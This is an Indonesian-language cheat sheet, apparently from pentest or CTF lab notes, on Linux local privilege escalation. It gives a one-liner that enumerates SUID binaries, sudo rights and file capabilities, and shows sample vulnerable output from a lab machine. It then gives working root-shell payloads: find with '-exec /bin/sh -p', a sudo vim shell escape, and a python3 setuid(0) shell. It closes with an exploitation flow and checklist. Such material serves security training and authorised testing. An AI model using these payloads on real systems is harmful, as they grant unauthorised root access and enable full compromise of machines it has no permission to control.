# Oneliner LPE — Enumerasi SUID, Sudo, dan Capabilities Sekaligus

> **Tujuan:** Menyingkap ketiga vektor privilege escalation Linux (SUID, sudo, capabilities) **dalam satu command** — langkah pertama setelah mendapatkan shell foothold, sekaligus command yang dipakai pada PoC laporan (langkah eskalasi root).

---

## Oneliner

```bash
# oneliner — enumerasi SUID, sudoers, dan capabilities dalam satu baris
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

Breakdown tiap segmen:

| Segmen | Fungsi | Vektor |
|--------|--------|--------|
| `find / -perm -4000 -type f 2>/dev/null` | Enumerasi semua binary ber-SUID bit | [SUID.md](SUID.md) |
| `sudo -l` | Enumerasi command yang boleh dijalankan via sudo | [Sudo.md](Sudo.md) |
| `getcap -r / 2>/dev/null` | Enumerasi binary ber-capabilities | [Capabilities.md](Capabilities.md) |

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. `2>/dev/null` membuang pesan error *Permission denied* agar output tetap bersih. Cukup **satu** entry RENTAN dari segmen mana pun untuk eskalasi ke root.

Varian non-interaktif — jika `sudo -l` meminta password (tidak NOPASSWD), ganti ke `sudo -n -l` agar langsung gagal tanpa menunggu input:

```bash
# oneliner non-interaktif — sudo -n -l langsung gagal jika butuh password
find / -perm -4000 -type f 2>/dev/null; sudo -n -l; getcap -r / 2>/dev/null
```

---

## Tampilan Output Rentan

Ketiga vektor terlihat sekaligus pada satu eksekusi (konteks lab `www-data@jobportal`):

```text
www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
/usr/bin/passwd
/usr/bin/find              ← RENTAN! -exec /bin/sh -p
/usr/bin/vim               ← RENTAN! :!/bin/sh -p
Matching Defaults entries for www-data on jobportal:
    env_reset, mail_badpass, secure_path=/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jobportal:
    (root) NOPASSWD: /usr/bin/vim   ← RENTAN! sudo vim -c ':!/bin/sh'
/usr/bin/python3 cap_setuid=ep      ← RENTAN! os.setuid(0) + exec shell
```

> **Capture:** Satu command langsung menyingkap ketiga vektor LPE — SUID `find`/`vim`, sudo `NOPASSWD: vim`, dan `python3 cap_setuid`. Daftar lengkap binary rentan per vektor ada di masing-masing file (SUID.md, Sudo.md, Capabilities.md).

---

## Langkah Setelah Output

Tiap entry RENTAN → cek GTFOBins → jalankan payload sesuai vektornya:

```bash
# SUID find — euid=0 via flag -p
find . -name x -exec /bin/sh -p \; -quit

# sudo vim — uid=0 penuh via shell escape
sudo vim -c ':!/bin/sh'

# capabilities python3 — setuid(0) dari interpreter
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

Konsistensi privilege tiap vektor:

| Vektor | Privilege Hasil | Ciri |
|--------|----------------|------|
| SUID | `euid=0` (uid user tetap) | Butuh flag `-p` agar euid bertahan |
| Sudo | `uid=0` penuh | Benar-benar berganti user ke root |
| Capabilities | `uid=0` via `setuid(0)` | Capability aktif hanya di binary itu |

---

## Alur Eksploitasi

```text
Oneliner (find / sudo -l / getcap)
    ↓
Identifikasi entry RENTAN
    ↓
Cek GTFOBins (SUID / Sudo / Capabilities)
    ↓
Jalankan payload sesuai vektor
    ↓
Verifikasi privilege dengan id
    ↓
Cari & baca flag (/usr/bin/find / -iname flag.txt)
```

---

## Checklist Oneliner LPE

- [ ] Jalankan oneliner segera setelah mendapatkan shell foothold.
- [ ] Tandai semua entry RENTAN dari ketiga segmen output.
- [ ] Cek tiap binary di [GTFOBins](https://gtfobins.github.io) sesuai vektornya.
- [ ] Pilih vektor termudah — cukup satu entry untuk root.
- [ ] Verifikasi dengan `id` → `euid=0` (SUID) / `uid=0` (sudo & capabilities).
- [ ] Cari flag lalu dokumentasikan sebagai PoC.

---

## Referensi

- [SUID.md](SUID.md) — enumerasi & eksploitasi binary SUID
- [Sudo.md](Sudo.md) — enumerasi & eksploitasi sudoers
- [Capabilities.md](Capabilities.md) — enumerasi & eksploitasi capabilities
- [GTFOBins](https://gtfobins.github.io/)
